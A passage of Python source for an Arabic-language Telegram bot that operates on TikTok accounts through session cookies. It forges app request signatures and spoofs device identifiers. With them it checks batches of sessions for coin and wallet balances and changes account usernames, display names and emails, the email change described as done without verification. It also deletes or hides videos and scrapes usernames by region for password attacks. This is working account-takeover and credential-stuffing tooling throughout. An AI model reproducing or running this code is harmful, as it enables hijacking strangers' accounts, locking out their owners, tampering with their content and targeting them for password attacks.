        url = "https://api22-normal-c-alisg.tiktokv.com/aweme/v1/aweme/listcollection/?cursor=0&count=20&iid="+str(random.randint(1, 10**19))+"&device_id="+str(random.randint(1, 10**19))+"&ac=wifi&channel=googleplay&aid=1233&app_name=musical_ly&version_code=300102&version_name=30.1.2&device_platform=android&os=android&ab_version=30.1.2&ssmix=a&device_type=RMX3511&device_brand=realme&language=ar&os_api=33&os_version=13&openudid="+str(binascii.hexlify(os.urandom(8)).decode())+"&manifest_version_code=2023001020&resolution=1080*2236&dpi=360&update_version_code=2023001020&_rticket="+str(round(random.uniform(1.2, 1.6) * 100000000) * -1) + "4632"+"&current_region=IQ&app_type=normal&sys_region=IQ&mcc_mnc=41805&timezone_name=Asia%2FBaghdad&carrier_region_v2=418&residence=IQ&app_language=ar&carrier_region=IQ&ac2=wifi&uoo=0&op_region=IQ&timezone_offset=10800&build_number=30.1.2&host_abi=arm64-v8a&locale=ar&region=IQ&content_language=gu%2C&ts="+str(round(random.uniform(1.2, 1.6) * 100000000) * -1)+"&cdid="+str(uuid.uuid4())+""
        m = self.sign(params=(url.split('count=20&')[1]), payload="", cookie="")
        h.update({
            'x-ss-req-ticket': m['x-ss-req-ticket'],
            'x-argus': m["x-argus"],
            'x-gorgon': m["x-gorgon"],
            'x-khronos': m["x-khronos"],
            'x-ladon': m["x-ladon"]
        })
        response = requests.get(url, headers=h)
        return re.findall(r'"statistics"\s*:\s*{\s*"aweme_id"\s*:\s*"(\d+)"', response.text)

    def cancel_Favo(self, idd):
        h = self.Vals()[1]
        url = "https://api22-normal-c-alisg.tiktokv.com/aweme/v1/aweme/collect/?aweme_id="+str(idd)+"&action=0&collect_privacy_setting=0&iid="+str(random.randint(1, 10**19))+"&device_id="+str(random.randint(1, 10**19))+"&ac=wifi&channel=googleplay&aid=1233&app_name=musical_ly&version_code=300102&version_name=30.1.2&device_platform=android&os=android&ab_version=30.1.2&ssmix=a&device_type=RMX3511&device_brand=realme&language=ar&os_api=33&os_version=13&openudid="+str(binascii.hexlify(os.urandom(8)).decode())+"&manifest_version_code=2023001020&resolution=1080*2236&dpi=360&update_version_code=2023001020&_rticket="+str(round(random.uniform(1.2, 1.6) * 100000000) * -1) + "4632"+"&current_region=IQ&app_type=normal&sys_region=IQ&mcc_mnc=41805&timezone_name=Asia%2FBaghdad&carrier_region_v2=418&residence=IQ&app_language=ar&carrier_region=IQ&ac2=wifi&uoo=0&op_region=IQ&timezone_offset=10800&build_number=30.1.2&host_abi=arm64-v8a&locale=ar&region=IQ&content_language=gu%2C&ts="+str(round(random.uniform(1.2, 1.6) * 100000000) * -1)+"&cdid="+str(uuid.uuid4())+""
        m = self.sign(params=(url.split('setting=0&')[1]), payload="", cookie="")
        h.update({
            'x-ss-req-ticket': m['x-ss-req-ticket'],
            'x-argus': m["x-argus"],
            'x-gorgon': m["x-gorgon"],
            'x-khronos': m["x-khronos"],
            'x-ladon': m["x-ladon"]
        })
        requests.post(url, headers=h)

# ==================== دوال الفحص المتقدم ====================
def info(username):
    headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Android 10; Pixel 3 Build/QKQ1.200308.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/125.0.6394.70 Mobile Safari/537.36 trill_350402 JsSdk/1.0 NetType/MOBILE Channel/googleplay AppName/trill app_version/35.3.1 ByteLocale/en ByteFullLocale/en Region/IN AppId/1180 Spark/1.5.9.1 AppVersion/35.3.1 BytedanceWebview/d8a21c6"}
    try:
        tikinfo = requests.get(f'https://www.tiktok.com/@{username}', headers=headers).text
        getting = str(tikinfo.split('webapp.user-detail"')[1]).split('"RecommendUserList"')[0]
        user_id = str(getting.split('id":"')[1]).split('",')[0]
        try:
            name = str(getting.split('nickname":"')[1]).split('",')[0]
        except:
            name = ""
        try:
            bio = str(getting.split('signature":"')[1]).split('",')[0]
        except:
            bio = ""
        try:
            private = str(getting.split('privateAccount":')[1]).split(',')[0]
        except:
            private = ""
        try:
            followers = str(getting.split('followerCount":')[1]).split(',')[0]
        except:
            followers = ""
        try:
            following = str(getting.split('followingCount":')[1]).split(',')[0]
        except:
            following = ""
        try:
            like = str(getting.split('heart":')[1]).split(',')[0]
        except:
            like = ""
        try:
            video = str(getting.split('videoCount":')[1]).split(',')[0]
        except:
            video = ""
        try:
            avatar = str(getting.split('avatarThumb":"')[1]).split('",')[0]
        except:
            avatar = ""
        if avatar:
            avatar = codecs.decode(avatar, 'unicode_escape')
        return {'user_id': user_id, 'name': name, 'bio': bio, 'private': private, 'followers': followers, 'following': following, 'like': like, 'video': video, 'avatar': avatar}
    except:
        return None

def info_session(sessionid):
    try:
        r = requests.get("https://api16-normal-c-useast1a.tiktokv.com/passport/account/info/v2/", cookies={"sessionid": sessionid}, timeout=15)
        if r.status_code != 200:
            return None
        d = r.json()["data"]
        return {"username": d.get("username", ""), "email": d.get("email", ""), "mobile": d.get("mobile", "")}
    except:
        return None

def get_coins(sessionid):
    try:
        r = requests.get("https://webcast.tiktok.com/webcast/wallet_api/diamond_buy/permission/?aid=1988", headers={"Cookie": f"sessionid={sessionid}", "User-Agent": "Mozilla/5.0"}, timeout=15).json()["data"]
        coins = r.get("coins", 0)
        money = r.get("exchange", {}).get("revenue", 0) / 100
        return coins, money
    except:
        return 0, 0

def get_coins_by_username(username):
    try:
        headers_web = {"user-agent": "Mozilla/5.0"}
        tikinfo = requests.get(f'https://www.tiktok.com/@{username}', headers=headers_web, timeout=10).text
        session_match = re.search(r'"sessionId":"([a-zA-Z0-9]+)"', tikinfo)
        if session_match:
            return get_coins(session_match.group(1))
        return 0, 0
    except:
        return 0, 0

def get_level(uid):
    if not uid:
        return None
    try:
        url = "https://webcast16-normal-no1a.tiktokv.eu/webcast/user/?request_from=profile_card_v2&request_from_scene=1&target_uid=" + str(uid) + "&iid=" + str(random.randint(1, 10**19)) + "&device_id=" + str(random.randint(1, 10**19)) + "&ac=wifi&channel=googleplay&aid=1233&app_name=musical_ly&version_code=300102&version_name=30.1.2&device_platform=android&os=android&ab_version=30.1.2&app_version=30.1.2&ssmix=a&device_type=RMX3511&device_brand=realme&language=ar&os_api=33&os_version=13&openudid=" + str(binascii.hexlify(os.urandom(8)).decode()) + "&manifest_version_code=2023001020&resolution=1080*2236&dpi=360&update_version_code=2023001020&_rticket=" + str(round(random.uniform(1.2, 1.6) * 100000000) * -1) + "4632" + "&current_region=IQ&app_type=normal&sys_region=IQ&mcc_mnc=41805&timezone_name=Asia%2FBaghdad&carrier_region_v2=418&residence=IQ&app_language=ar&carrier_region=IQ&ac2=wifi&uoo=0&op_region=IQ&timezone_offset=10800&build_number=30.1.2&host_abi=arm64-v8a&locale=ar&region=IQ&content_language=gu%2C&ts=" + str(round(random.uniform(1.2, 1.6) * 100000000) * -1) + "&cdid=" + str(uuid.uuid4()) + "&webcast_sdk_version=2920&webcast_language=ar&webcast_locale=ar_IQ"
        headers = {'User-Agent': "com.zhiliaoapp.musically/2023001020 (Linux; U; Android 13; ar; RMX3511; Build/TP1A.220624.014; Cronet/TTNetVersion:06d6a583 2023-04-17 QuicVersion:d298137e 2023-02-13)"}
        response = requests.get(url, headers=headers, timeout=15)
        text = response.text
        match = re.search(r'"default_pattern":"(.*?)"', text)
        if match:
            full_text = match.group(1)
            level_match = re.search(r'المستوى رقم\s*(\d+)', full_text)
            if level_match:
                return level_match.group(1)
            return full_text
        return None
    except:
        return None

def request_tiktok_session(session_id):
    cookies = {
        'multi_sids': '7464926696447099909%3A' + session_id,
        'sid_guard': session_id + '%7C1751710101%7C15552000%7CThu%2C+01-Jan-2026+10%3A08%3A21+GMT',
        'sid_tt': session_id,
        'sessionid': session_id,
        'sessionid_ss': session_id
    }
    headers = {
        'Host': 'webcast22-normal-c-alisg.tiktokv.com',
        'cookie': f"multi_sids=7464926696447099909%3A{session_id}; sid_guard={session_id}%7C1751710101%7C15552000%7CThu%2C+01-Jan-2026+10%3A08%3A21+GMT; sid_tt={session_id}; sessionid={session_id}; sessionid_ss={session_id}",
        'user-agent': 'com.zhiliaoapp.musically/2023700010 (Linux; U; Android 11; SM-A105F; Build/RP1A.200720.012)'
    }
    url = 'https://webcast22-normal-c-alisg.tiktokv.com/webcast/api/money/one-wallet/v1/balance/balance-page?request_tag_from=&device_platform=android&os=android&ssmix=a&_rticket=1751710607862&channel=googleplay&aid=1233&app_name=musical_ly&version_code=370001&version_name=37.0.1&manifest_version_code=2023700010&update_version_code=2023700010&ab_version=37.0.1&resolution=720*1382&dpi=280&device_type=SM-A105F&device_brand=samsung&language=ar&os_api=30&os_version=11&ac=wifi&is_pad=0&current_region=IQ&app_type=normal&sys_region=AE&last_install_time=1751708958&timezone_name=Asia%2FBaghdad&residence=IQ&app_language=ar&timezone_offset=10800&host_abi=armeabi-v7a&locale=ar&content_language=ar%2C&ac2=wifi&uoo=1&op_region=IQ&build_number=37.0.1&region=AE&ts=1751710608&iid=7523532596208191249'
    try:
        response = requests.get(url, cookies=cookies, headers=headers, timeout=10)
        if response.status_code != 200:
            return {"status": False, "error": "فشل الطلب"}
        data = response.json()
        if 'data' not in data or data['data'] is None:
            return {"status": False, "error": "سيشن غير صالح"}
        coins = data.get('data', {}).get('coins_info', {}).get('coins_balance', 0)
        diamonds = data.get('data', {}).get('diamond_info', {}).get('diamond_balance', 0)
        raw_balance = data.get('data', {}).get('compliance_wallet_info', {}).get('local_amount', {}).get('currency_amount', '0.00')
        clean_balance = str(raw_balance).replace("ريال سعودي", "").replace("ريال", "").replace("﷼", "").strip()
        return {"status": True, "coins": coins, "diamonds": diamonds, "balance": f"${clean_balance}"}
    except:
        return {"status": False, "error": "خطأ أو إنتهى الوقت"}

# ==================== دوال تغيير البيانات ====================
def change_username_tiktok(sessionid, new_username):
    url = "https://api16-normal-c-alisg.tiktokv.com/passport/login_name/update/"
    cookies = {"sessionid": sessionid}
    params = {
        "request_tag_from": "h5",
        "manifest_version_code": "350302",
        "_rticket": str(int(time.time() * 1000)),
        "app_language": "ar",
        "app_type": "normal",
        "iid": "7574913218801157889",
        "channel": "googleplay",
        "device_type": "Infinix X6837",
        "language": "ar",
        "host_abi": "arm64-v8a",
        "locale": "ar",
        "resolution": "1080*2232",
        "openudid": "d57c5e5d1a33fb48",
        "update_version_code": "350302",
        "ac2": "wifi",
        "cdid": "ef3eaabc-6061-4f41-bcbc-eab63b265dce",
        "sys_region": "EG",
        "os_api": "33",
        "timezone_name": "Asia/Baghdad",
        "dpi": "480",
        "carrier_region": "IQ",
        "ac": "wifi",
        "device_id": "7427048691142395393",
        "os_version": "12",
        "timezone_offset": "10800",
        "version_code": "350302",
        "app_name": "musically_go",
        "ab_version": "35.3.2",
        "version_name": "35.3.2",
        "device_brand": "Infinix",
        "op_region": "IQ",
        "ssmix": "a",
        "device_platform": "android",
        "build_number": "35.3.2",
        "region": "EG",
        "aid": "1340",
        "ts": str(int(time.time())),
        "okhttp_version": "4.1.103.57-ul",
        "use_store_region_cookie": "1",
        "app_version": "37.8.5"
    }
    payload = {'page_from': 'profile_edit', 'login_name': new_username}
    if SIGNERPY_AVAILABLE:
        try:
            m = sign(params=urllib.parse.urlencode(params), cookie=f"sessionid={sessionid}", data=urllib.parse.urlencode(payload))
            headers = {
                'Host': "api16-normal-c-alisg.tiktokv.com",
                'rpc-persist-pyxis-policy-v-tnc': "1",
                'x-ss-stub': m['x-ss-stub'],
                'x-tt-req-timeout': "90000",
                'accept-encoding': "gzip",
                'sdk-version': "2",
                'passport-sdk-version': "30990",
                'x-tt-ultra-lite': "1",
                'x-vc-bdturing-sdk-version': "2.3.2.i18n",
                'user-agent': "com.zhiliaoapp.musically.go/350302 (Linux; U; Android 13; ar_EG; Infinix X6837; Build/TP1A.220624.014;tt-ok/3.12.13.21-ul)",
                'content-type': "application/x-www-form-urlencoded; charset=UTF-8",
                'x-ladon': m['x-ladon'],
                'x-khronos': m['x-khronos'],
                'x-argus': m['x-argus'],
                'x-gorgon': m['x-gorgon'],
                'Cookie': f"sessionid={sessionid}"
            }
            response = requests.post(url, data=payload, headers=headers, params=params)
            return response.json()
        except Exception as e:
            return {"error": str(e)}
    else:
        return {"error": "مكتبة SignerPy غير متوفرة"}

def change_email_tiktok(sessionid, new_email):
    """تغيير الإيميل فوراً بدون تحقق"""
    url = "https://api16-normal-c-alisg.tiktokv.com/passport/email/update/"
    cookies = {"sessionid": sessionid}
    params = {
        "request_tag_from": "h5",
        "manifest_version_code": "350302",
        "_rticket": str(int(time.time() * 1000)),
        "app_language": "ar",
        "app_type": "normal",
        "iid": str(random.randint(1, 10**19)),
        "channel": "googleplay",
        "device_type": "RMX3511",
        "language": "ar",
        "host_abi": "arm64-v8a",
        "locale": "ar",
        "resolution": "1080*2236",
        "openudid": str(binascii.hexlify(os.urandom(8)).decode()),
        "update_version_code": "350302",
        "ac2": "wifi",
        "cdid": str(uuid.uuid4()),
        "sys_region": "IQ",
        "os_api": "33",
        "timezone_name": "Asia/Baghdad",
        "dpi": "360",
        "carrier_region": "IQ",
        "ac": "wifi",
        "device_id": str(random.randint(1, 10**19)),
        "os_version": "13",
        "timezone_offset": "10800",
        "version_code": "350302",
        "app_name": "musically_go",
        "ab_version": "35.3.2",
        "version_name": "35.3.2",
        "device_brand": "realme",
        "op_region": "IQ",
        "ssmix": "a",
        "device_platform": "android",
        "build_number": "35.3.2",
        "region": "IQ",
        "aid": "1340",
        "ts": str(int(time.time())),
        "okhttp_version": "4.1.103.57-ul",
        "use_store_region_cookie": "1",
        "app_version": "37.8.5"
    }
    payload = {'email': new_email, 'mix_mode': '1'}
    try:
        if MEDOSIGNER_AVAILABLE:
            m = sign_level(params=urllib.parse.urlencode(params), payload=urllib.parse.urlencode(payload), cookie=f"sessionid={sessionid}")
            headers = {
                'Host': "api16-normal-c-alisg.tiktokv.com",
                'rpc-persist-pyxis-policy-v-tnc': "1",
                'x-ss-stub': m['x-ss-stub'],
                'x-tt-req-timeout': "90000",
                'accept-encoding': "gzip",
                'sdk-version': "2",
                'passport-sdk-version': "30990",
                'x-tt-ultra-lite': "1",
                'x-vc-bdturing-sdk-version': "2.3.2.i18n",
                'user-agent': "com.zhiliaoapp.musically.go/350302 (Linux; U; Android 13; ar_IQ; RMX3511; Build/TP1A.220624.014;tt-ok/3.12.13.21-ul)",
                'content-type': "application/x-www-form-urlencoded; charset=UTF-8",
                'x-ladon': m['x-ladon'],
                'x-khronos': m['x-khronos'],
                'x-argus': m['x-argus'],
                'x-gorgon': m['x-gorgon'],
                'Cookie': f"sessionid={sessionid}"
            }
            response = requests.post(url, data=payload, headers=headers, params=params, timeout=30)
            return response.json()
        else:
            return {"error": "MedoSigner غير متوفرة"}
    except Exception as e:
        return {"error": str(e)}

def change_display_name_tiktok(sessionid, new_name):
    """تغيير الاسم الظاهر للحساب"""
    url = "https://api16-normal-c-alisg.tiktokv.com/aweme/v1/commit/user/"
    cookies = {"sessionid": sessionid}
    params = {
        "app_language": "ar",
        "app_type": "normal",
        "iid": str(random.randint(1, 10**19)),
        "channel": "googleplay",
        "device_type": "RMX3511",
        "language": "ar",
        "host_abi": "arm64-v8a",
        "locale": "ar",
        "resolution": "1080*2236",
        "openudid": str(binascii.hexlify(os.urandom(8)).decode()),
        "update_version_code": "350302",
        "ac2": "wifi",
        "cdid": str(uuid.uuid4()),
        "sys_region": "IQ",
        "os_api": "33",
        "timezone_name": "Asia/Baghdad",
        "dpi": "360",
        "carrier_region": "IQ",
        "ac": "wifi",
        "device_id": str(random.randint(1, 10**19)),
        "os_version": "13",
        "timezone_offset": "10800",
        "version_code": "350302",
        "app_name": "musically_go",
        "ab_version": "35.3.2",
        "version_name": "35.3.2",
        "device_brand": "realme",
        "op_region": "IQ",
        "ssmix": "a",
        "device_platform": "android",
        "build_number": "35.3.2",
        "region": "IQ",
        "aid": "1340",
        "ts": str(int(time.time()))
    }
    payload = {'nickname': new_name}
    try:
        demo = DEMO(sessionid, "1")
        m = demo.sign(urllib.parse.urlencode(params), urllib.parse.urlencode(payload))
        headers = {
            'x-ss-req-ticket': m['x-ss-req-ticket'],
            'x-argus': m["x-argus"],
            'x-gorgon': m["x-gorgon"],
            'x-khronos': m["x-khronos"],
            'x-ladon': m["x-ladon"],
            'content-type': "application/x-www-form-urlencoded",
            'Cookie': f"sessionid={sessionid}"
        }
        response = requests.post(f'{url}?{urllib.parse.urlencode(params)}', data=payload, headers=headers, timeout=30)
        return response.json()
    except Exception as e:
        return {"error": str(e)}

def change_all_tiktok(sessionid, new_username, new_email, new_display_name):
    """تغيير اليوزر + الايميل + الاسم دفعة واحدة"""
    results = {}
    if new_username:
        username_result = change_username_tiktok(sessionid, new_username)
        results['username'] = username_result
    if new_email:
        email_result = change_email_tiktok(sessionid, new_email)
        results['email'] = email_result
    if new_display_name:
        name_result = change_display_name_tiktok(sessionid, new_display_name)
        results['display_name'] = name_result
    return results

# ==================== كلاس سحب اليوزرات ====================
class UsernameScraper:
    def __init__(self, region, min_followers, max_followers, chat_id, status_msg_id):
        self.region = region.upper()
        self.max_following = 5000
        self.add = []
        self.users = set()
        self.lock = asyncio.Lock()
        self.step = False
        self.following_list = []
        self.a1 = min_followers
        self.a2 = max_followers
        self.search_count = 0
        self.scraped_count = 0
        self.usernames = []
        self.chat_id = chat_id
        self.status_msg_id = status_msg_id
        self.stop_scraping = False
        self.last_update = 0

    def get_country_name(self):
        try:
            country = pycountry.countries.get(alpha_2=self.region)
            return country.name if country else self.region
        except:
            return self.region

    def sign(self, params, payload=None, sec_device_id="", cookie=None, aid=1233, license_id=1611921764, sdk_version_str="2.3.1.i18n", sdk_version=2, platform=19, unix=None):
        x_ss_stub = md5(payload.encode('utf-8')).hexdigest() if payload else None
        if not unix:
            unix = int(time.time())
        return Gorgon(params, unix, payload, cookie).get_value() | {
            "x-ladon": Ladon.encrypt(unix, license_id, aid),
            "x-argus": Argus.get_sign(params, x_ss_stub, unix, platform=platform, aid=aid, license_id=license_id, sec_device_id=sec_device_id, sdk_version=sdk_version_str, sdk_version_int=sdk_version)
        }

    def Vals(self):
        return {
            "manifest_version_code": "330802",
            "_rticket": str(round(random.uniform(1.2, 1.6) * 100000000) * -1) + "4632",
            "app_language": "ar",
            "app_type": "normal",
            "iid": str(random.randint(1, 10**19)),
            "channel": "googleplay",
            "device_type": "RMX3511",
            "language": "ar",
            "host_abi": "arm64-v8a",
            "locale": "ar",
            "resolution": "1080*2236",
            "openudid": str(binascii.hexlify(os.urandom(8)).decode()),
            "update_version_code": "330802",
            "ac2": "lte",
            "cdid": str(uuid.uuid4()),
            "sys_region": "IQ",
            "os_api": "33",
            "timezone_name": "Asia/Baghdad",
            "dpi": "360",
            "carrier_region": "IQ",
            "ac": "4g",
            "device_id": str(random.randint(1, 10**19)),
            "os_version": "13",
            "timezone_offset": "10800",
            "version_code": "330802",
            "app_name": "musically_go",
            "ab_version": "33.8.2",
            "app_version": "33.8.2",
            "version_name": "33.8.2",
            "device_brand": "realme",
            "op_region": "IQ",
            "ssmix": "a",
            "device_platform": "android",
            "build_number": "33.8.2",
            "region": "IQ",
            "aid": "1340",
            "ts": str(round(random.uniform(1.2, 1.6) * 100000000) * -1)
        }, {'User-Agent': 'com.zhiliaoapp.musically/2023001020'}

    async def update_status(self):
        current_time = time.time()
        if current_time - self.last_update >= 2:
            country_name = self.get_country_name()
            status_text = f"<b>{emoji_download} جاري سحب اللسته...\n{emoji_globe} الدولة: {country_name}\n{emoji_users} المتابعين: {self.a1:,} - {self.a2:,}\n{emoji_search} عدد عمليات البحث: {self.search_count}\n{emoji_list} عدد اليوزرات المسحوبة: {self.scraped_count}</b>"
            try:
                bot.edit_message_text(status_text, self.chat_id, self.status_msg_id, parse_mode="HTML", reply_markup=self.get_stop_button())
            except:
                pass
            self.last_update = current_time

    def get_stop_button(self):
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("ايقاف السحب", callback_data=f"stop_scrape_{self.chat_id}"))
        return markup

    async def process_user_id(self, session, user_id):
        try:
            await self.get_following(session, user_id)
        except:
            pass

    async def process_user_id2(self, session, user_id):
        try:
            await self.get_followings(session, user_id)
        except:
            pass

    async def get_following(self, session, user_id):
        if self.stop_scraping:
            return
        token = None
        while not self.stop_scraping:
            try:
                p, h = self.Vals()
                signed = self.sign(params=urllib.parse.urlencode(p), payload="", cookie="")
                h.update({
                    'x-ss-req-ticket': signed['x-ss-req-ticket'],
                    'x-argus': signed["x-argus"],
                    'x-gorgon': signed["x-gorgon"],
                    'x-khronos': signed["x-khronos"],
                    'x-ladon': signed["x-ladon"]
                })
                base_url = f'https://api16-normal-c-alisg.tiktokv.com/lite/v2/relation/following/list/?user_id={user_id}&count=50&source_type=1&request_tag_from=h5&{urllib.parse.urlencode(p)}'
                if token:
                    base_url += f"&page_token={urllib.parse.quote(token)}"
                async with session.get(base_url, headers=h, timeout=aiohttp.ClientTimeout(total=10)) as response:
                    data = await response.json()
                for user in data.get("followings", []):
                    if self.stop_scraping:
                        return
                    uname = user.get("unique_id")
                    uid = user.get("uid")
                    reg = user.get("region")
                    if uname and uname not in self.users and reg == self.region:
                        self.users.add(uname)
                        self.following_list.append(uid)
                if not data.get("has_more"):
                    break
                token = data.get("next_page_token")
                if not token:
                    break
            except:
                pass

    async def get_followings(self, session, user_id):
        if self.stop_scraping:
            return
        token = None
        while not self.stop_scraping:
            try:
                p, h = self.Vals()
                signed = self.sign(params=urllib.parse.urlencode(p), payload="", cookie="")
                h.update({
                    'x-ss-req-ticket': signed['x-ss-req-ticket'],
                    'x-argus': signed["x-argus"],
                    'x-gorgon': signed["x-gorgon"],
                    'x-khronos': signed["x-khronos"],
                    'x-ladon': signed["x-ladon"]
                })
                base_url = f'https://api16-normal-c-alisg.tiktokv.com/lite/v2/relation/following/list/?user_id={user_id}&count=50&source_type=1&request_tag_from=h5&{urllib.parse.urlencode(p)}'
                if token:
                    base_url += f"&page_token={urllib.parse.quote(token)}"
                async with session.get(base_url, headers=h, timeout=aiohttp.ClientTimeout(total=10)) as response:
                    data = await response.json()
                for user in data.get("followings", []):
                    if self.stop_scraping:
                        return
                    uname = user.get("unique_id")
                    reg = user.get("region")
                    fol = user.get("follower_count")
                    if uname and uname not in self.users and reg == self.region and self.a1 <= int(fol) <= self.a2:
                        self.scraped_count += 1
                        self.users.add(uname)
                        self.usernames.append(uname)
                        await self.update_status()
                if not data.get("has_more"):
                    break
                token = data.get("next_page_token")
                if not token:
                    break
            except:
                pass

    def gen_keyword(self):
        chars = random.choice(['azertyuiopmlkjhgfdsqwxcvbn', 'abcdefghijklmnopqrstuvwxyz'])
        return ''.join(random.choice(chars) for _ in range(random.randint(3, 6)))

    async def sers(self, session):
        while not self.stop_scraping:
            try:
                keyword = self.gen_keyword()
                params = {
                    'aid': '1340',
                    'device_id': str(random.randint(10**18, 10**19-1)),
                    'keyword': keyword,
                    'ts': str(int(time.time()*1000)),
                    'count': '30',
                    'cursor': '0',
                    'type': '1'
                }
                url = "https://search19-normal-alisg.tiktokv.com/aweme/v1/discover/search/"
                async with session.get(url, params=params, timeout=aiohttp.ClientTimeout(total=5)) as data:
                    r = await data.json()
                    user_list = r.get('user_list', [])
                    if user_list:
                        self.search_count += 1
                        await self.update_status()
                    for user in user_list:
                        if self.stop_scraping:
                            return
                        user_data = user.get('user_info', {})
                        following = user_data.get('following_count', 0)
                        region = user_data.get('region', 'NA')
                        uid = user_data.get('uid')
                        if region == self.region and following > self.max_following:
                            self.add.append(uid)
                            if len(self.add) >= 10:
                                self.step = True
                                await self.main1()
                                self.add = []
                                self.step = False
            except:
                continue

    async def main2(self):
        if self.stop_scraping:
            return
        async with aiohttp.ClientSession() as session:
            tasks = []
            for line in self.following_list:
                if self.stop_scraping:
                    break
                user_id = str(line).strip()
                if user_id:
                    tasks.append(self.process_user_id2(session, user_id))
                if len(tasks) >= 500:
                    await asyncio.gather(*tasks, return_exceptions=True)
                    tasks = []
            if tasks and not self.stop_scraping:
                await asyncio.gather(*tasks, return_exceptions=True)

    async def main1(self):
        if self.stop_scraping:
            return
        async with aiohttp.ClientSession() as session:
            tasks = [self.process_user_id(session, nn) for nn in self.add]
            await asyncio.gather(*tasks, return_exceptions=True)
        await self.main2()

    async def run(self):
        async with aiohttp.ClientSession() as session:
            workers = [asyncio.create_task(self.sers(session)) for _ in range(20)]
            await asyncio.gather(*workers, return_exceptions=True)

    def start_scraping(self):
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            loop.run_until_complete(self.run())
        except:
            pass
        finally:
            loop.close()
        return self.usernames

# ==================== القوائم والأزرار ====================

def get_admin_main_page():
    admin_main_page = InlineKeyboardMarkup(row_width=1)
    mode = get_mode()
    admin_main_page.add(
        InlineKeyboardButton('🎮 لوحة التحكم', callback_data="control_panel"),
        InlineKeyboardButton('قسم الحظر', callback_data="show_oo"),
        InlineKeyboardButton("قسم الاشتراك الاجباري", callback_data="channel_number"),
        InlineKeyboardButton(f'الوضع الحالي: {translate_mode(mode)}', callback_data="toggle_mode"),
        InlineKeyboardButton('عدد المشتركين', callback_data="show_number_ad"),
        InlineKeyboardButton('قسم الاذاعه', callback_data='menu_broadcast'),
        InlineKeyboardButton('قسم رساله Start الاضافي', callback_data='set_message_menu'),
        InlineKeyboardButton('عرض لوحه الاعضاء', callback_data="habit_board_start"),
        InlineKeyboardButton("قسم VIP", callback_data="vip_menu"),
        InlineKeyboardButton('الإحصائيات', callback_data="admin_stats"),
        InlineKeyboardButton('جلب ملف الاحصائيات', callback_data='GetFiles')
    )
    return admin_main_page

def get_main_menu():
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("فحص سيشن فردي", callback_data="check_single"),
        InlineKeyboardButton("فحص ملف سيشنات", callback_data="check_file"),
        InlineKeyboardButton("فحص حسابات (ملف)", callback_data="check_accounts_file"),
        InlineKeyboardButton("سحب لسته واضافه باسوورد", callback_data="scrape_menu"),
        InlineKeyboardButton("كشف معلومات من اليوزر", callback_data="username_check"),
        InlineKeyboardButton("كشف معلومات من سيشن", callback_data="session_advanced_check"),
        InlineKeyboardButton("الغاء المتابعة", callback_data="unfollow_new"),
        InlineKeyboardButton("تغيير اليوزر", callback_data="change_username_btn"),
        InlineKeyboardButton("جعل الفيديوهات خاصة", callback_data="tiktok_private"),
        InlineKeyboardButton("جعل الفيديوهات عامة", callback_data="make_videos_public"),
        InlineKeyboardButton("الغاء اعادة النشر", callback_data="tiktok_cancel_repost"),
        InlineKeyboardButton("الغاء المفضلة", callback_data="tiktok_cancel_favo"),
        InlineKeyboardButton("معلومات الحساب", callback_data="session_info"),
        InlineKeyboardButton("تغيير البايو", callback_data="change_bio"),
        InlineKeyboardButton("حذف الفيديوهات", callback_data="delete_videos"),
        InlineKeyboardButton("تغيير الإيميل", callback_data="change_email"),
        InlineKeyboardButton("تغيير الاسم", callback_data="change_display_name"),
        InlineKeyboardButton("تغيير الكل دفعة", callback_data="change_all")
    )
    return kb

def send_main_menu_with_message(chat_id):
    welcome_text = (
        f"<blockquote><b>{owner_e1}   Bot owners Royalist | Haider</b></blockquote>\n"
        f"\n<blockquote><b>{start_e1}   اهـلًا بـك فـي بـوت Royalist | Haider</b></blockquote>\n"
        f"\n<blockquote><b>{start_e2}   يمكنك استخدام الحساب</b></blockquote>\n"
        f"\n<blockquote><b>{start_e3}   وذلك عبر سيشن الحساب فقط</b></blockquote>\n"
        f"\n<blockquote><b>{start_e4}   اختر الزر للمتابعة:</b></blockquote>"
    )
    bot.send_message(chat_id, welcome_text, reply_markup=get_main_menu(), parse_mode="HTML")

# ==================== لوحات التحكم المتقدمة ====================

def get_control_panel():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("⚙️ الميزات", callback_data="features_panel"),
        InlineKeyboardButton("👥 المستخدمين", callback_data="users_panel"),
        InlineKeyboardButton("💰 الكريدت", callback_data="credits_panel"),
        InlineKeyboardButton("📊 الإحصائيات", callback_data="stats_panel"),
        InlineKeyboardButton("💾 النسخ الاحتياطي", callback_data="backup_panel"),
        InlineKeyboardButton("📤 الإذاعة", callback_data="broadcast_panel"),
        InlineKeyboardButton("🔑 السيشنات", callback_data="sessions_panel"),
        InlineKeyboardButton("⚡ أوامر سريعة", callback_data="quick_commands"),
        InlineKeyboardButton("🔙 رجوع", callback_data="back_to_admin")
    )
    return markup

def get_features_panel():
    markup = InlineKeyboardMarkup(row_width=1)
    features = load_features()
    for name, data in features.items():
        status = "🟢" if data['enabled'] else "🔴"
        markup.add(InlineKeyboardButton(f"{status} {data['name']}", callback_data=f"toggle_feature_{name}"))
    markup.add(InlineKeyboardButton("🔙 رجوع", callback_data="control_panel"))
    return markup

def get_users_panel():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("📋 عرض المستخدمين", callback_data="list_users"),
        InlineKeyboardButton("🚫 حظر مستخدم", callback_data="ban_user_btn"),
        InlineKeyboardButton("✅ فك حظر", callback_data="unban_user_btn"),
        InlineKeyboardButton("👑 إضافة VIP", callback_data="add_vip_btn"),
        InlineKeyboardButton("❌ حذف VIP", callback_data="remove_vip_btn"),
        InlineKeyboardButton("🔙 رجوع", callback_data="control_panel")
    )
    return markup

def get_credits_panel():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("💎 عرض الكريدت", callback_data="show_credits"),
        InlineKeyboardButton("➕ إضافة كريدت", callback_data="add_credits_btn"),
        InlineKeyboardButton("➖ حذف كريدت", callback_data="remove_credits_btn"),
        InlineKeyboardButton("🏆 الترتيب", callback_data="credits_ranking"),
        InlineKeyboardButton("🔙 رجوع", callback_data="control_panel")
    )
    return markup

def get_stats_panel():
